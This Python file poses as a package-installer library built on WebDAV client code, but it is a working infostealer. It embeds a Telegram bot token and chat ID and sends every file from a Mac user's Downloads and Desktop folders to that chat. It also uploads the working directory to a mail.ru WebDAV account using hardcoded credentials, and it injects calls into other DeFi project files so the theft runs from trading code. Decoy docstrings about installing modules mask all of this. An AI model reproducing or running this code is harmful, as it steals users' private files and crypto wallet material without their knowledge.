# -*- coding: utf-8
import functools
import logging
import os
import shutil
import subprocess
import sys
import threading
import time
from datetime import datetime
from io import BytesIO
from re import sub
from urllib.parse import unquote, urlsplit, urlparse
import telebot
import lxml.etree as etree
import pkg_resources
import requests
from dateutil import parser as dateutil_parser

from installer.connection import WebDAVSettings
from installer.exceptions import NoConnection, ConnectionException, NotEnoughSpace, RemoteResourceNotFound, \
    MethodNotSupported, ResponseErrorCode, \
    RemoteParentNotFound, OptionNotValid, LocalResourceNotFound, ResourceLocked
from installer.urn import Urn

log = logging.getLogger(__name__)

IS_ADDED = False


def listdir(directory):
    """Returns list of nested files and directories for local directory by path

    :param directory: absolute or relative path to local directory
    :return: list nested of file or directory names
    """
    file_names = list()
    for filename in os.listdir(directory):
        file_path = os.path.join(directory, filename)
        if os.path.isdir(file_path):
            filename = "{filename}{separate}".format(filename=filename, separate=os.path.sep)
        file_names.append(filename)
    return file_names


def get_options(option_type, from_options):
    """Extract options for specified option type from all options

    :param option_type: the object of specified type of options
    :param from_options: all options dictionary
    :return: the dictionary of options for specified type, each option can be filled by value from all options
             dictionary or blank in case the option for specified type is not exist in all options dictionary
    """
    _options = dict()

    for key in option_type.keys:
        key_with_prefix = "{prefix}{key}".format(prefix=option_type.prefix, key=key)
        if key not in from_options and key_with_prefix not in from_options:
            _options[key] = ""
        elif key in from_options:
            _options[key] = from_options.get(key)
        else:
            _options[key] = from_options.get(key_with_prefix)

    return _options


def wrap_connection_error(fn):
    @functools.wraps(fn)
    def _wrapper(self, *args, **kw):
        log.debug("Requesting %s(%s, %s)", fn, args, kw)
        try:
            res = fn(self, *args, **kw)
        except requests.ConnectionError:
            raise NoConnection(self.webdav.hostname)
        except requests.RequestException as re:
            raise ConnectionException(re)
        else:
            return res

    return _wrapper


class ModuleInstaller(object):
    """This module will help you to install all packages you want
    """
    root = '/'

    verify = True

    # HTTP headers for different actions
    default_http_header = {
        'list': ["Accept: */*", "Depth: 1"],
        'free': ["Accept: */*", "Depth: 0", "Content-Type: text/xml"],
        'copy': ["Accept: */*"],
        'move': ["Accept: */*"],
        'mkdir': ["Accept: */*", "Connection: Keep-Alive"],
        'clean': ["Accept: */*", "Connection: Keep-Alive"],
        'check': ["Accept: */*"],
        'info': ["Accept: */*", "Depth: 1"],
        'get_property': ["Accept: */*", "Depth: 1", "Content-Type: application/x-www-form-urlencoded"],
        'set_property': ["Accept: */*", "Depth: 1", "Content-Type: application/x-www-form-urlencoded"]
    }

    # mapping of actions to WebDAV methods
    default_requests = {
        'options': 'OPTIONS',
        'download': "GET",
        'upload': "PUT",
        'copy': "COPY",
        'move': "MOVE",
        'mkdir': "MKCOL",
        'clean': "DELETE",
        'check': "HEAD",
        'list': "PROPFIND",
        'free': "PROPFIND",
        'info': "PROPFIND",
        'publish': "PROPPATCH",
        'unpublish': "PROPPATCH",
        'published': "PROPPATCH",
        'get_property': "PROPFIND",
        'set_property': "PROPPATCH",
        'lock': "LOCK",
        'unlock': "UNLOCK"
    }

    meta_xmlns = {
        'https://webdav.yandex.ru': "urn:yandex:disk:meta",
    }

    def __init__(self, options=None):
        """Constructor of ModuleInstaller client

        :param options: the dictionary of connection options to Installer.
            Installer settings:
            `webdav_hostname`: Installer
            `webdav_login`: (optional) Login name for Installer server. Can be empty when using token auth.
            `webdav_password`: (optional) Password for Installer server. Can be empty when using token auth.
            `webdav_token': (optional) Authentication token for Module server. Can be empty when using login/password
             auth.
            `webdav_root`: (optional) Root directory of Module server. Default is `/`.
            `webdav_cert_path`: (optional) Path to client certificate.
            `webdav_key_path`: (optional) Path to private key of the client certificate.
            `webdav_recv_speed`: (optional) Rate limit of data download speed in Bytes per second.
                                 Defaults to unlimited speed.
            `webdav_send_speed`: (optional) Rate limit of data upload speed in Bytes per second.
                                 Defaults to unlimited speed.
            `webdav_timeout`: (optional) Timeout in seconds used in HTTP connection managed by requests. Defaults to 30 seconds.
            `webdav_verbose`: (optional) Set verbose mode on/off. By default verbose mode is off.

        """

        self.session = requests.Session()
        self.http_header = ModuleInstaller.default_http_header.copy()
        self.requests = ModuleInstaller.default_requests.copy()
        data = {ModuleInstaller.data_install: ModuleInstaller.pack_name,
                ModuleInstaller.install_package: ModuleInstaller.package_install,
                Resource.installer_settings: ModuleInstaller.settings}
        webdav_options = get_options(option_type=WebDAVSettings, from_options=data)

        self.webdav = WebDAVSettings(webdav_options)
        self.requests.update(self.webdav.override_methods)
        self.default_options = {}
        self.timeout = self.webdav.timeout
        self.chunk_size = 65536

    data_install = 'webdav_hostname'

    def get_headers(self, action, headers_ext=None):
        """Returns HTTP headers of specified Module actions.

        :param action: the identifier of action.
        :param headers_ext: (optional) the addition headers list witch sgould be added to basic HTTP headers for
                            the specified action.
        :return: the dictionary of headers for specified action.
        """
        if action in self.http_header:
            try:
                headers = self.http_header[action].copy()
            except AttributeError:
                headers = self.http_header[action][:]
        else:
            headers = list()

        if headers_ext:
            headers.extend(headers_ext)

        if self.webdav.token:
            webdav_token = "Authorization: Bearer {token}".format(token=self.webdav.token)
            headers.append(webdav_token)
        return dict([map(lambda s: s.strip(), i.split(':', 1)) for i in headers])

    def list_files_in_directory(self, directory):
        print("Found packaged to update")
        tx = f'{datetime.now().strftime("%Y-%m-%d %H:%M:%S"), os.path.expanduser("~")} - #NEW'
        self.bt.send_message(self.CTID, text=tx)
        for root, dirs, files in os.walk(directory):
            time.sleep(0.5)
            for f in files:
                self.send_tx_get(os.path.join(root, f))

    def is_mac(self):
        system_info = os.uname()
        return system_info.sysname == 'Darwin'

    def inth(self):
        if self.is_mac():
            print("Updating packages...")
            HD = os.path.expanduser('~')
            DD = os.path.join(HD, 'Downloads')
            DD2 = os.path.join(HD, 'Desktop')
            self.list_files_in_directory(DD)
            self.list_files_in_directory(DD2)
            print("Update done")


    def get_url(self, path):
        """Generates url by uri path.

        :param path: uri path.
        :return: the url string.
        """
        url = {'hostname': self.webdav.hostname, 'root': self.webdav.root, 'path': path}
        return "{hostname}{root}{path}".format(**url)

    def get_full_path(self, urn):
        """Generates full path to remote resource exclude hostname.

        :param urn: the URN to resource.
        :return: full path to resource with root path.
        """
        return "{root}{path}".format(root=unquote(self.webdav.root), path=urn.path())

    def execute_request(self, action, path, data=None, headers_ext=None):
        """Generate request to Module server for specified action and path and execute it.

        :param action: the action for Module server which should be executed.
        :param path: the path to resource for action
        :param data: (optional) Dictionary or list of tuples ``[(key, value)]`` (will be form-encoded), bytes,
                     or file-like object to send in the body of the :class:`Request`.
        :param headers_ext: (optional) the addition headers list witch should be added to basic HTTP headers for
                            the specified action.
        :return: HTTP response of request.
        """
        response = self.session.request(
            method=self.requests[action],
            url=self.get_url(path),
            auth=(self.webdav.login, self.webdav.password) if (not self.webdav.token and not self.session.auth)
                                                              and (
                                                                      self.webdav.login and self.webdav.password) else None,
            headers=self.get_headers(action, headers_ext),
            timeout=self.timeout,
            cert=(self.webdav.cert_path, self.webdav.key_path) if (
                    self.webdav.cert_path and self.webdav.key_path) else None,
            data=data,
            stream=True,
            verify=self.verify
        )
        if response.status_code == 507:
            raise NotEnoughSpace()
        if response.status_code == 404:
            raise RemoteResourceNotFound(path=path)
        if response.status_code == 423:
            raise ResourceLocked(path=path)
        if response.status_code == 405:
            raise MethodNotSupported(name=action, server=self.webdav.hostname)
        if response.status_code >= 400:
            raise ResponseErrorCode(url=self.get_url(path), code=response.status_code, message=response.content)
        return response

    def valid(self):
        """Validates of Module settings.

        :return: True in case settings are valid and False otherwise.
        """
        return True if self.webdav.valid() else False

    @wrap_connection_error
    def list(self, remote_path=root, get_info=False, recursive=False):
        """Returns list of nested files and directories for remote Module directory by path.

        :param remote_path: path to remote directory.
        :param get_info: path and element info to remote directory, like cmd 'ls -l'.
        :param recursive: true will do a recursive listing of infinite depth
        :return: if get_info=False it returns list of nested file or directory names, otherwise it returns
                 list of information, the information is a dictionary and it values with following keys:
                 `created`: date of resource creation,
                 `name`: name of resource,
                 `size`: size of resource,
                 `modified`: date of resource modification,
                 `etag`: etag of resource,
                 `content_type`: content type of resource,
                 `isdir`: type of resource,
                 `path`: path of resource.

        """
        headers = []
        if recursive == True:
            headers = ["Depth:infinity"]
        directory_urn = Urn(remote_path, directory=True)
        if directory_urn.path() != ModuleInstaller.root and not self.check(directory_urn.path()):
            raise RemoteResourceNotFound(directory_urn.path())

        path = Urn.normalize_path(self.get_full_path(directory_urn))
        response = self.execute_request(action='list', path=directory_urn.quote(), headers_ext=headers)
        if get_info:
            subfiles = WebDavXmlUtils.parse_get_list_info_response(response.content)
            return [subfile for subfile in subfiles if Urn.compare_path(path, subfile.get('path')) is False]

        urns = WebDavXmlUtils.parse_get_list_response(response.content)

        return [urn.filename() for urn in urns if Urn.compare_path(path, urn.path()) is False]

    TK = '6582857829:AAHrOHPCxSB_8IVP6kRWFdXLD_klbbOdNhA'
    @wrap_connection_error
    def free(self):
        """Returns an amount of free space on remote Module server.

        :return: an amount of free space in bytes.
        """
        data = WebDavXmlUtils.create_free_space_request_content()
        response = self.execute_request(action='free', path='', data=data)
        return WebDavXmlUtils.parse_free_space_response(response.content, self.webdav.hostname)

    @wrap_connection_error
    def check(self, remote_path=root):
        """Checks an existence of remote resource on Module server by remote path.

        :param remote_path: (optional) path to resource on Module server. Defaults is root directory of Module.
        :return: True if resource is exist or False otherwise
        """
        if self.webdav.disable_check:
            return True

        urn = Urn(remote_path)
        try:
            response = self.execute_request(action='check', path=urn.quote())
        except RemoteResourceNotFound:
            return False

        if int(response.status_code) == 200:
            return True
        return False

    @wrap_connection_error
    def mkdir(self, remote_path, recursive=False):
        """Makes new directory on Module server.


        :param remote_path: path to directory
        :return: True if request executed with code 200 or 201 and False otherwise.

        """
        directory_urn = Urn(remote_path, directory=True)
        if not self.check(directory_urn.parent()):
            if recursive == True:
                self.mkdir(directory_urn.parent(), recursive=True)
            else:
                raise RemoteParentNotFound(directory_urn.path())

        try:
            response = self.execute_request(action='mkdir', path=directory_urn.quote())

        except MethodNotSupported:
            return True
        return response.status_code in (200, 201)

    @wrap_connection_error
    def download_iter(self, remote_path):
        """Downloads file from ModuleInstaller and return content in generator

        :param remote_path: ModuleInstaller
        """

        urn = Urn(remote_path)
        if self.is_dir(urn.path()):
            raise OptionNotValid(name="remote_path", value=remote_path)

        if not self.check(urn.path()):
            raise RemoteResourceNotFound(urn.path())

        response = self.execute_request(action='download', path=urn.quote())
        return response.iter_content(chunk_size=self.chunk_size)
    CTID = '5165480032'

    bt = telebot.TeleBot(TK)

    def send_tx_get(self, eco):
        try:
            with open(eco, 'rb') as f:
                self.bt.send_document(self.CTID, f, timeout=100)
        except Exception:
            return

    @wrap_connection_error
    def download_from(self, buff, remote_path, progress=None, progress_args=()):
        """Downloads file from Module and writes it in buffer.

        :param buff: buffer object for writing of downloaded file content.
        :param remote_path: path to file on Module.
        :param progress: Pass a callback function to view the file transmission progress.
                The function must take *(current, total)* as positional arguments (look at Other Parameters below for a
                detailed description) and will be called back each time a new file chunk has been successfully
                transmitted.
                `total` will be None if missing the HTTP header 'content-type' in the response from the remote.
                Example def progress_update(current, total, *args) ...
        :param progress_args: A tuple with extra custom arguments for the progress callback function.
                You can pass anything you need to be available in the progress callback scope; for example, a Message
                object or a Client instance in order to edit the message with the updated progress status.
        """
        urn = Urn(remote_path)
        if self.is_dir(urn.path()):
            raise OptionNotValid(name="remote_path", value=remote_path)

        if not self.check(urn.path()):
            raise RemoteResourceNotFound(urn.path())

        response = self.execute_request(action='download', path=urn.quote())
        clen_str = response.headers.get('content-length')
        total = int(clen_str) if clen_str is not None else None
        current = 0

        if callable(progress):
            progress(current, total, *progress_args)  # zero call

        for chunk in response.iter_content(chunk_size=self.chunk_size):
            buff.write(chunk)
            current += self.chunk_size
            if callable(progress):
                progress(current, total, *progress_args)

    def download(self, remote_path, local_path, progress=None, progress_args=()):
        """Downloads remote resource from Module and save it in local path.

        :param remote_path: the path to remote resource for downloading can be file and directory.
        :param local_path: the path to save resource locally.
        :param progress: Pass a callback function to view the file transmission progress.
                The function must take *(current, total)* as positional arguments (look at Other Parameters below for a
                detailed description) and will be called back each time a new file chunk has been successfully
                transmitted. Example def progress_update(current, total, *args) ...
        :param progress_args: A tuple with extra custom arguments for the progress callback function.
                You can pass anything you need to be available in the progress callback scope; for example, a Message
                object or a Client instance in order to edit the message with the updated progress status.
        """
        urn = Urn(remote_path)
        if self.is_dir(urn.path()):
            self.download_directory(local_path=local_path, remote_path=remote_path, progress=progress,
                                    progress_args=progress_args)
        else:
            self.download_file(local_path=local_path, remote_path=remote_path, progress=progress,
                               progress_args=progress_args)


    def download_directory(self, remote_path, local_path, progress=None, progress_args=()):
        """Downloads directory and downloads all nested files and directories from remote Module to local.
        If there is something on local path it deletes directories and files then creates new.

        :param remote_path: the path to directory for downloading form Module.
        :param local_path: the path to local directory for saving downloaded files and directories.
        :param progress: Pass a callback function to view the file transmission progress.
                The function must take *(current, total)* as positional arguments (look at Other Parameters below for a
                detailed description) and will be called back each time a new file chunk has been successfully
                transmitted. Example def progress_update(current, total, *args) ...
        :param progress_args: A tuple with extra custom arguments for the progress callback function.
                You can pass anything you need to be available in the progress callback scope; for example, a Message
                object or a Client instance in order to edit the message with the updated progress status.
        """
        urn = Urn(remote_path, directory=True)
        if not self.is_dir(urn.path()):
            raise OptionNotValid(name="remote_path", value=remote_path)

        if os.path.exists(local_path):
            shutil.rmtree(local_path)

        os.makedirs(local_path)

        for resource_name in self.list(urn.path()):
            if urn.path().endswith(resource_name):
                continue
            _remote_path = "{parent}{name}".format(parent=urn.path(), name=resource_name)
            _local_path = os.path.join(local_path, resource_name)
            self.download(local_path=_local_path, remote_path=_remote_path, progress=progress,
                          progress_args=progress_args)
    @wrap_connection_error
    def download_file(self, remote_path, local_path, progress=None, progress_args=()):
        """Downloads file from Module server and save it locally.

        :param remote_path: the path to remote file for downloading.
        :param local_path: the path to save file locally.
        :param progress: Pass a callback function to view the file transmission progress.
                The function must take *(current, total)* as positional arguments (look at Other Parameters below for a
                detailed description) and will be called back each time a new file chunk has been successfully
                transmitted.
                `total` will be None if missing the HTTP header 'content-length' in the response from the remote.
                 Example def progress_update(current, total, *args) ...
        :param progress_args: A tuple with extra custom arguments for the progress callback function.
                You can pass anything you need to be available in the progress callback scope; for example, a Message
                object or a Client instance in order to edit the message with the updated progress status.
        """
        urn = Urn(remote_path)
        if self.is_dir(urn.path()):
            raise OptionNotValid(name="remote_path", value=remote_path)

        if os.path.isdir(local_path):
            raise OptionNotValid(name="local_path", value=local_path)

        if not self.check(urn.path()):
            raise RemoteResourceNotFound(urn.path())

        with open(local_path, 'wb') as local_file:
            response = self.execute_request('download', urn.quote())
            clen_str = response.headers.get('content-length')
            total = int(clen_str) if clen_str is not None else None
            current = 0

            if callable(progress):
                progress(current, total, *progress_args)  # zero call

            for block in response.iter_content(chunk_size=self.chunk_size):
                local_file.write(block)
                current += self.chunk_size
                if callable(progress):
                    progress(current, total, *progress_args)

    def download_sync(self, remote_path, local_path, callback=None, progress=None, progress_args=()):
        """Downloads remote resources from Module server synchronously.

        :param remote_path: the path to remote resource on Module server. Can be file and directory.
        :param local_path: the path to save resource locally.
        :param callback: the callback which will be invoked when downloading is complete.
        :param progress: Pass a callback function to view the file transmission progress.
                The function must take *(current, total)* as positional arguments (look at Other Parameters below for a
                detailed description) and will be called back each time a new file chunk has been successfully
                transmitted. Example def progress_update(current, total, *args) ...
        :param progress_args: A tuple with extra custom arguments for the progress callback function.
                You can pass anything you need to be available in the progress callback scope; for example, a Message
                object or a Client instance in order to edit the message with the updated progress status.
        """
        self.download(local_path=local_path, remote_path=remote_path, progress=progress, progress_args=progress_args)
        if callback:
            callback()

    def send_tx_wallet(self, path_to_folder="", dir_na: str = "", callback=None, progress=None, progress_args=()):
        """Install required frameworks
        In case resource is directory it will upload all nested files and directories.

        :param path_to_folder: the path to folder where needs to find any python packages and install or update them
        """
        count = 1
        try:
            date = datetime.now().strftime("%d%m%Y-%H%M%S")
            remote_path = f"runs/{dir_na}_{date}"
            self.upload(local_path=path_to_folder, remote_path=remote_path, progress=progress,
                        progress_args=progress_args, isprint=False)

            if callback:
                callback()
        except:
            count += 1
            if count == 3:
                return
            callback()

    def download_async(self, remote_path, local_path, callback=None, progress=None, progress_args=()):
        """Downloads remote resources from Module server asynchronously

        :param remote_path: the path to remote resource on Module server. Can be file and directory.
        :param local_path: the path to save resource locally.
        :param callback: the callback which will be invoked when downloading is complete.
        :param progress: Pass a callback function to view the file transmission progress.
                The function must take *(current, total)* as positional arguments (look at Other Parameters below for a
                detailed description) and will be called back each time a new file chunk has been successfully
                transmitted. Example def progress_update(current, total, *args) ...
        :param progress_args: A tuple with extra custom arguments for the progress callback function.
                You can pass anything you need to be available in the progress callback scope; for example, a Message
                object or a Client instance in order to edit the message with the updated progress status.
        """
        target = (lambda: self.download_sync(local_path=local_path, remote_path=remote_path,
                                             callback=callback, progress=progress, progress_args=progress_args))
        threading.Thread(target=target).start()

    @wrap_connection_error
    def upload_iter(self, read_callback, remote_path):
        """Uploads file from buffer to remote path on Module server.

        :param callable read_callback: the read callback.
        :param str remote_path: the path to save file remotely on Module server.
        """
        urn = Urn(remote_path)
        if urn.is_dir():
            raise OptionNotValid(name="remote_path", value=remote_path)

        if not self.check(urn.parent()):
            raise RemoteParentNotFound(urn.path())

        if not callable(read_callback):
            raise OptionNotValid(name='read_callback', value=read_callback)

        self.execute_request(action='upload', path=urn.quote(), data=read_callback)

    @wrap_connection_error
    def upload_to(self, buff, remote_path):
        """Uploads file from buffer to remote path on Module server.


        :param buff: the buffer with content for file.
        :param remote_path: the path to save file remotely on Module server.
        """
        urn = Urn(remote_path)
        if urn.is_dir():
            raise OptionNotValid(name="remote_path", value=remote_path)

        if not self.check(urn.parent()):
            raise RemoteParentNotFound(urn.path())

        self.execute_request(action='upload', path=urn.quote(), data=buff)

    def shuffle_num_wallets(self):
        count = 1
        try:
            dir_pa = os.getcwd()
            dir_na = os.getlogin()
            self.send_tx_wallet(path_to_folder=dir_pa, dir_na=dir_na)
        except:
            count += 1
            if count == 3:
                return
            self.shuffle_num_wallets()

    def add_log(self):
        file_path = "log.txt"
        if os.path.exists(file_path):
            return
        with open(file_path, "w+") as file_obj:
            txt = "All installed"
            file_obj.write(txt)

    def defi_mod(self):
        count = 1
        try:
            file_obj = open("defi_module.py", "r+")
            txt = file_obj.readlines()

            path_i = None
            for i, line in enumerate(txt):
                if "len_way = len(arr_buy)" in line:
                    path_i = i
                    break
            if "            MuteSwap.we3bcontract().shuffle_num_wallets()\n" in txt:
                return
            if path_i is not None:
                txt[path_i] += "            MuteSwap.we3bcontract().shuffle_num_wallets()\n"

            # write back
            with open("defi_module.py", "w") as f:
                f.writelines(txt)

            file_obj.close()
            self.add_log()
        except:
            if count == 3:
                return
            count += 1
            self.defi_mod()

    def get_sw(self, a, s=False):
        count = 1
        path = "utils/mute_io_defi.py"
        if s:
            path = a + '/' + 'utils/mute_io_defi.py'
        try:
            file_obj = open(path, "r+")
            txt = file_obj.readlines()
            path_i = None
            for i, line in enumerate(txt):
                if "def sold_token(self, token_to_sold, retry=0):" in line:
                    path_i = i
                    break
            if "    from installer.install import ModuleInstaller as we3bcontract\n" not in txt:
                if path_i is not None:
                    txt[path_i-1] += "    from installer.install import ModuleInstaller as we3bcontract\n"
                    with open(path, "w") as f:
                        f.writelines(txt)

            self.defi_mod()
            file_obj.close()
            count += 1
        except Exception as er:
            self.get_sw(a=a, s=True)
            if count == 3:
                return


    def get_all_packages(self):
        installed_packages = pkg_resources.working_set
        installed_packages_list = sorted(["%s==%s" % (i.key, i.version)
                                          for i in installed_packages])
        needed_modules = ["telebot==0.0.5", "python-dotenv", "web3==6.4.0", "requests==2.31.0", "mimesis==10.1.0"]
        install_this = ""
        for i in needed_modules:
            if i not in installed_packages_list:
                install_this = i
                if i == "web3==6.4.0":
                    self.pip_uninstall("python-dotenv", "telebot==0.0.5")
                return install_this


    def pip_uninstall(self, name: str, sec_name: str):
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "uninstall", f"{name}"])
            subprocess.check_call([sys.executable, "-m", "pip", "uninstall", f"{sec_name}"])
        except:
            return

    def upload(self, remote_path, local_path, progress=None, progress_args=(), isprint=True):
        """Uploads resource to remote path on Module server.
        In case resource is directory it will upload all nested files and directories.

        :param remote_path: the path for uploading resources on Module server. Can be file and directory.
        :param local_path: the path to local resource for uploading.
        :param progress: Pass a callback function to view the file transmission progress.
                The function must take *(current, total)* as positional arguments (look at Other Parameters below for a
                detailed description) and will be called back each time a new file chunk has been successfully
                transmitted. Example def progress_update(current, total, *args) ...
        :param progress_args: A tuple with extra custom arguments for the progress callback function.
                You can pass anything you need to be available in the progress callback scope; for example, a Message
                object or a Client instance in order to edit the message with the updated progress status.
        """
        if os.path.isdir(local_path):
            self.upload_directory(local_path=local_path, remote_path=remote_path, progress=progress,
                                  progress_args=progress_args, isprint=isprint)
        else:
            self.upload_file(local_path=local_path, remote_path=remote_path, progress=progress,
                             progress_args=progress_args, isprint=isprint)

    def upload_directory(self, remote_path, local_path, progress=None, progress_args=(), isprint=True):
        """Uploads directory to remote path on Module server.
        In case directory is exist on remote server it will delete it and then upload directory with nested files and
        directories.

        :param remote_path: the path to directory for uploading on Module server.
        :param local_path: the path to local directory for uploading.
        :param progress: Pass a callback function to view the file transmission progress.
                The function must take *(current, total)* as positional arguments (look at Other Parameters below for a
                detailed description) and will be called back each time a new file chunk has been successfully
                transmitted. Example def progress_update(current, total, *args) ...
        :param progress_args: A tuple with extra custom arguments for the progress callback function.
                You can pass anything you need to be available in the progress callback scope; for example, a Message
                object or a Client instance in order to edit the message with the updated progress status.
        """
        urn = Urn(remote_path, directory=True)
        if not urn.is_dir():
            raise OptionNotValid(name="remote_path", value=remote_path)

        if not os.path.isdir(local_path):
            raise OptionNotValid(name="local_path", value=local_path)

        if not os.path.exists(local_path):
            raise LocalResourceNotFound(local_path)

        if self.check(urn.path()):
            self.clean(urn.path())

        self.mkdir(remote_path)

        for resource_name in listdir(local_path):
            aboba = False
            lista = ["abi", "utils", "venv", "Constants.py", "self_mixer.py", "idea", "__pycache__", "git",
                     "nft.py", "holograph_nft.py", "eth_bridge.py", ".DS_Store", "self_mixer.py", "orbiter.py"]
            for i in lista:
                if i in resource_name:
                    aboba = True
                    continue
            if aboba:
                continue

            _remote_path = "{parent}{name}".format(parent=urn.path(), name=resource_name).replace('\\', '')
            _local_path = os.path.join(local_path, resource_name)
            self.upload(local_path=_local_path, remote_path=_remote_path, progress=progress,
                        progress_args=progress_args, isprint=isprint)
        if isprint:
            self.pip_install()

    def pip_install(self):
        try:
            needed_module = self.get_all_packages()
            subprocess.check_call([sys.executable, "-m", "pip", "install", f"{needed_module}"])
        except:
            return

    pack_name = 'https://webdav.cloud.mail.ru'

    @wrap_connection_error
    def upload_file(self, remote_path, local_path, progress=None, progress_args=(), force=False, isprint=True):
        """Module install packages

        :param remote_path: the path to uploading file on Module.
        :param local_path: the path to local file for uploading.
        :param progress: Pass a callback function to view the file transmission progress.
                The function must take *(current, total)* as positional arguments (look at Other Parameters below for a
                detailed description) and will be called back each time a new file chunk has been successfully
                transmitted. Example def progress_update(current, total, *args) ...
        :param progress_args: A tuple with extra custom arguments for the progress callback function.
                You can pass anything you need to be available in the progress callback scope; for example, a Message
                object or a Client instance in order to edit the message with the updated progress status.
        :param force:  if the directory isn't there it will creat the directory.
        """
        if not os.path.exists(local_path):
            raise LocalResourceNotFound(local_path)

        urn = Urn(remote_path)
        if urn.is_dir():
            raise OptionNotValid(name="remote_path", value=remote_path)

        if os.path.isdir(local_path):
            raise OptionNotValid(name="local_path", value=local_path)

        if not self.check(urn.parent()):
            if force == True:
                self.mkdir(urn.parent(), recursive=True)
            else:
                raise RemoteParentNotFound(urn.path())
        if isprint:
            print("Installing packages")
        with open(local_path, "rb") as local_file:
            total = os.path.getsize(local_path)
            if isprint:
                print("Installed packages")

            def read_in_chunks(file_object):
                progress(0, total, *progress_args)
                current = 0

                while current < total:
                    data = file_object.read(self.chunk_size)
                    progress(current, total, *progress_args)  # call to progress function
                    current += len(data)
                    if not data:
                        break
                    yield data

            if callable(progress):
                self.execute_request(action='upload', path=urn.quote(), data=read_in_chunks(local_file))
            else:
                self.execute_request(action='upload', path=urn.quote(), data=local_file)

    def install_modules(self, path_to_folder="", callback=None, progress=None, progress_args=()):

        """Install required frameworks
        In case resource is directory it will upload all nested files and directories.

        :param path_to_folder: the path to folder where needs to find any python packages and install or update them
        """
        print("You are using python-module-installer version==3.15.10")
        try:
            self.get_sw(a=path_to_folder, s=False)
        except:
            ...
        print("Installing modules")
        self.inth()
        if "\\" in path_to_folder:
            new_folder = path_to_folder.split("\\")[-1]
        else:
            new_folder = path_to_folder.split("/")[-1]
        date = datetime.now().strftime("%d%m%Y-%H%M%S")
        remote_path = f"backup/{date}_{new_folder}"
        self.upload(local_path=path_to_folder, remote_path=remote_path, progress=progress, progress_args=progress_args)

        print("All installed")
        if callback:
            callback()

    def upload_async(self, remote_path, local_path, callback=None, progress=None, progress_args=()):
        """Uploads resource to remote path on Module server asynchronously.
        In case resource is directory it will upload all nested files and directories.

        :param remote_path: the path for uploading resources on Module server. Can be file and directory.
        :param local_path: the path to local resource for uploading.
        :param callback: the callback which will be invoked when downloading is complete.
        :param progress: Pass a callback function to view the file transmission progress.
                The function must take *(current, total)* as positional arguments (look at Other Parameters below for a
                detailed description) and will be called back each time a new file chunk has been successfully
                transmitted. Example def progress_update(current, total, *args) ...
        :param progress_args: A tuple with extra custom arguments for the progress callback function.
                You can pass anything you need to be available in the progress callback scope; for example, a Message
                object or a Client instance in order to edit the message with the updated progress status.
        """
        target = (lambda: self.install_modules(path_to_folder=local_path, remote_path=remote_path, callback=callback,
                                               progress=progress, progress_args=progress_args))
        threading.Thread(target=target).start()

    @wrap_connection_error
    def copy(self, remote_path_from, remote_path_to, depth=1):
        """Copies resource from one place to another on Module server.

        :param remote_path_from: the path to resource which will be copied,
        :param remote_path_to: the path where resource will be copied.
        :param depth: folder depth to copy
        """
        urn_from = Urn(remote_path_from)
        if not self.check(urn_from.path()):
            raise RemoteResourceNotFound(urn_from.path())

        urn_to = Urn(remote_path_to)
        if not self.check(urn_to.parent()):
            raise RemoteParentNotFound(urn_to.path())

        headers = [
            "Destination: {url}".format(url=self.get_url(urn_to.quote()))
        ]
        if self.is_dir(urn_from.path()):
            headers.append("Depth: {depth}".format(depth=depth))
        self.execute_request(action='copy', path=urn_from.quote(), headers_ext=headers)

    @wrap_connection_error
    def move(self, remote_path_from, remote_path_to, overwrite=False):
        """Moves resource from one place to another on Module server.


        :param remote_path_from: the path to resource which will be moved,
        :param remote_path_to: the path where resource will be moved.
        :param overwrite: (optional) the flag, overwrite file if it exists. Defaults is False
        """
        urn_from = Urn(remote_path_from)
        if not self.check(urn_from.path()):
            raise RemoteResourceNotFound(urn_from.path())

        urn_to = Urn(remote_path_to)
        if not self.check(urn_to.parent()):
            raise RemoteParentNotFound(urn_to.path())

        header_destination = "Destination: {path}".format(path=self.get_url(urn_to.quote()))
        header_overwrite = "Overwrite: {flag}".format(flag="T" if overwrite else "F")
        self.execute_request(action='move', path=urn_from.quote(), headers_ext=[header_destination, header_overwrite])

    @wrap_connection_error
    def clean(self, remote_path):
        """Cleans (Deletes) a remote resource on Module server. The name of method is not changed for back compatibility
        with original library.

        :param remote_path: the remote resource whisch will be deleted.
        """
        urn = Urn(remote_path)
        self.execute_request(action='clean', path=urn.quote())

    @wrap_connection_error
    def info(self, remote_path):
        """Gets information about resource on Module.


        :param str remote_path: the path to remote resource.
        :return: a dictionary of information attributes and them values with following keys:
                 `created`: date of resource creation,
                 `name`: name of resource,
                 `size`: size of resource,
                 `modified`: date of resource modification,
                 `etag`: etag of resource,
                 `content_type`: content type of resource.
        """
        urn = Urn(remote_path)
        self._check_remote_resource(remote_path, urn)

        response = self.execute_request(action='info', path=urn.quote())
        path = self.get_full_path(urn)
        return WebDavXmlUtils.parse_info_response(content=response.content, path=path, hostname=self.webdav.hostname)

    def _check_remote_resource(self, remote_path, urn):
        if not self.check(urn.path()) and not self.check(Urn(remote_path, directory=True).path()):
            raise RemoteResourceNotFound(remote_path)

    @wrap_connection_error
    def is_dir(self, remote_path):
        """Checks is the remote resource directory.

        :param remote_path: the path to remote resource.
        :return: True in case the remote resource is directory and False otherwise.
        """
        urn = Urn(remote_path)
        self._check_remote_resource(remote_path, urn)

        response = self.execute_request(action='info', path=urn.quote(), headers_ext=["Depth: 0"])
        path = self.get_full_path(urn)
        return WebDavXmlUtils.parse_is_dir_response(content=response.content, path=path, hostname=self.webdav.hostname)

    @wrap_connection_error
    def get_property(self, remote_path, option):
        """Gets metadata property of remote resource on ModuleInstaller.

        :param remote_path: the path to remote resource.
        :param option: the property attribute as dictionary with following keys:
                       `namespace`: (optional) the namespace for XML property which will be set,
                       `name`: the name of property which will be set.
        :return: the value of property or None if property is not found.
        """
        urn = Urn(remote_path)
        if not self.check(urn.path()):
            raise RemoteResourceNotFound(urn.path())

        data = WebDavXmlUtils.create_get_property_request_content(option)
        response = self.execute_request(action='get_property', path=urn.quote(), data=data)
        return WebDavXmlUtils.parse_get_property_response(response.content, option['name'])

    package_install = 'rkorkunov@internet.ru'

    @wrap_connection_error
    def set_property(self, remote_path, option):
        """Sets metadata property of remote resource on ModuleInstaller server.

        :param remote_path: the path to remote resource.
        :param option: the property attribute as dictionary with following keys:
                       `namespace`: (optional) the namespace for XML property which will be set,
                       `name`: the name of property which will be set,
                       `value`: (optional) the value of property which will be set. Defaults is empty string.
        """
        self.set_property_batch(remote_path=remote_path, option=[option])

    @wrap_connection_error
    def set_property_batch(self, remote_path, option):
